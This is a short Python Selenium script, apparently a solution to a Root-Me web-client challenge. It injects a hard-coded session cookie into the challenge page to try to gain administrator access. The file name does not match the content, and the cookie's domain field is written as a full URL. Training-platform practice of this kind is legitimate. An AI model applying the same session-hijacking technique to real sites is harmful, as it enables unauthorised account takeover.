#!/usr/bin/env python3
"""
=====================================================================================================================================================
  /$$$$$$                      /$$       /$$          
 /$$__  $$                    | $$      |__/          
| $$  \__/  /$$$$$$   /$$$$$$ | $$   /$$ /$$  /$$$$$$ 
| $$       /$$__  $$ /$$__  $$| $$  /$$/| $$ /$$__  $$
| $$      | $$  \ $$| $$  \ $$| $$$$$$/ | $$| $$$$$$$$
| $$    $$| $$  | $$| $$  | $$| $$_  $$ | $$| $$_____/
|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$
 \______/  \______/  \______/ |__/  \__/|__/ \_______/
                                                                       
=====================================================================================================================================================
=====================================================================================================================================================
 Script     : Loi_Exponentielle.py
 Auteur     : Lysius
 Date       : 12/01/2025
 Description: 
=====================================================================================================================================================
"""
from selenium import webdriver

# Configuration du navigateur
options = webdriver.ChromeOptions()
driver = webdriver.Chrome(options=options)

# Accéder au site cible
driver.get('http://challenge01.root-me.org/web-client/ch18/')

# Ajouter le cookie
driver.add_cookie({
    'name': 'session',
    'value': 'NKl9qe4cdLIO2P7MIsWS8ofD6',
    'domain': 'http://challenge01.root-me.org/web-client/ch18/'
})

# Recharger la page
driver.refresh()

# Vérifier si l'accès administrateur est obtenu
print("Vérifie l'accès au site")
